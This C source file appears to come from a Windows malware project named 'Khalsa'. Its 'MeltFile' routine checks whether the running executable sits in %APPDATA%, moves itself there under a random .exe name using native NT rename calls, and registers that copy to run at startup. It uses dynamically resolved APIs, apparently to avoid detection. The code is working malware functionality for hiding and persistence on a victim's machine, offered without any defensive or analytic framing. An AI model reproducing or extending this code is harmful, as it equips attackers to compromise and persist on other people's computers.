#include "khalsa_melt.h"
#include "khalsa_registry.h"
#include "khalsa_clib.h"
BOOL FileNameWithDirectory(LPWSTR lpszOut) {
    NTSTATUS status = STATUS_UNSUCCESSFUL;
    ULONG uLen = 0;
    PUNICODE_STRING ImageFileName = NULL;
    status = _NtQueryInformationProcess(NtCurrentProcess(), ProcessImageFileName, ImageFileName, 0, &uLen);
    if (status != STATUS_INFO_LENGTH_MISMATCH)
        goto exit;

    ImageFileName = _HeapAlloc(_GetProcessHeap(), 0, uLen);
    if (ImageFileName == NULL)
        goto exit;


    ZeroBuffer(ImageFileName, uLen);
    status = _NtQueryInformationProcess(NtCurrentProcess(), ProcessImageFileName, ImageFileName, uLen, &uLen);
    if (!NT_SUCCESS(status))
        goto exit;
    _memcpy(lpszOut, ImageFileName->Buffer, ImageFileName->Length);

exit:
    if (ImageFileName != NULL)
        _HeapFree(_GetProcessHeap(), 0, ImageFileName);

    return NT_SUCCESS(status);
}
BOOL MeltFile(PBOOL bAlreadyMelted) {
    BOOL rv = FALSE;
    NTSTATUS status = STATUS_UNSUCCESSFUL;

    WCHAR szCurrentPath[MAX_PATH], szAppDataPath[MAX_PATH], szNewFilePath[MAX_PATH];

    DWORD nSize = MAX_PATH;
    USHORT UniSize = min(nSize, UNICODE_STRING_MAX_CHARS - 2);

    UNICODE_STRING usCurrentNtPath, usAppDataPath, usAppDataNtPath,
        usNewFullPath, usSource, usAppDataStr = RTL_CONSTANT_STRING(L"%APPDATA%");



    HANDLE hFile = INVALID_HANDLE_VALUE;
    ULONG RandomFileName[8];
    IO_STATUS_BLOCK IoStatusBlock;
    OBJECT_ATTRIBUTES ObjectAttributes;
    PFILE_RENAME_INFORMATION RenameInfo = NULL;




    ZeroBuffer(szCurrentPath, MAX_PATH);
    ZeroBuffer(szAppDataPath, MAX_PATH);

    _RtlGetCurrentDirectory_U(nSize * sizeof(WCHAR), szCurrentPath);
    _RtlDosPathNameToRelativeNtPathName_U(szCurrentPath, &usCurrentNtPath, NULL, NULL);

    RtlInitEmptyUnicodeString(&usAppDataPath, szAppDataPath, UniSize * sizeof(WCHAR));
    status = _RtlExpandEnvironmentStrings_U(NULL, &usAppDataStr, &usAppDataPath, &nSize);
    _RtlDosPathNameToRelativeNtPathName_U(usAppDataPath.Buffer, &usAppDataNtPath, NULL, NULL);

    if (__CmpStrW(usCurrentNtPath.Buffer, usAppDataNtPath.Buffer) == 0) {
        *bAlreadyMelted = TRUE;
        goto exit;
    }
    *bAlreadyMelted = FALSE;


    ZeroBuffer(RandomFileName, 8);
    ZeroBuffer(szNewFilePath, MAX_PATH);
    _RtlGenRandom(RandomFileName, 7);

    rv = FileNameWithDirectory(szNewFilePath);

    _wsprintfW(szAppDataPath, L"%s\\%d.exe", usAppDataPath.Buffer, RandomFileName);
    _RtlDosPathNameToRelativeNtPathName_U(szAppDataPath, &usNewFullPath, NULL, NULL);
  


    _RtlInitUnicodeString(&usSource, szNewFilePath);

    InitializeObjectAttributes(&ObjectAttributes, &usSource, OBJ_CASE_INSENSITIVE, NULL, NULL);
    status = _NtOpenFile(&hFile, FILE_READ_ATTRIBUTES | DELETE | SYNCHRONIZE, &ObjectAttributes, &IoStatusBlock,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_FOR_BACKUP_INTENT | ((MOVEFILE_WRITE_THROUGH & MOVEFILE_WRITE_THROUGH) ? FILE_WRITE_THROUGH : 0));

    if (!NT_SUCCESS(status))
        goto exit;

    RenameInfo = _HeapAlloc(_GetProcessHeap(), 0, usNewFullPath.Length + sizeof(FILE_RENAME_INFORMATION));
    if (RenameInfo == NULL) 
        goto exit;
    
    _memcpy(&RenameInfo->FileName, usNewFullPath.Buffer, usNewFullPath.Length);
    RenameInfo->ReplaceIfExists = FALSE;
    RenameInfo->RootDirectory = 0;
    RenameInfo->FileNameLength = usNewFullPath.Length;
    status = _NtSetInformationFile(hFile, &IoStatusBlock, RenameInfo, usNewFullPath.Length + sizeof(FILE_RENAME_INFORMATION), FileRenameInformation);


    rv = NT_SUCCESS(status);
    if (!rv)
        goto exit;

    rv = Khalsa_RegisterStartup(szAppDataPath);
exit:
    if (RenameInfo != NULL)
        _HeapFree(_GetProcessHeap(), 0, RenameInfo);

    if (usNewFullPath.Buffer != NULL)
        _HeapFree(_GetProcessHeap(), 0, usNewFullPath.Buffer);

    if (usCurrentNtPath.Buffer != NULL)
        _HeapFree(_GetProcessHeap(), 0, usCurrentNtPath.Buffer);

    if (usAppDataNtPath.Buffer != NULL)
        _HeapFree(_GetProcessHeap(), 0, usAppDataNtPath.Buffer);


    if (hFile != INVALID_HANDLE_VALUE)
        _NtClose(hFile);

    return rv;
}
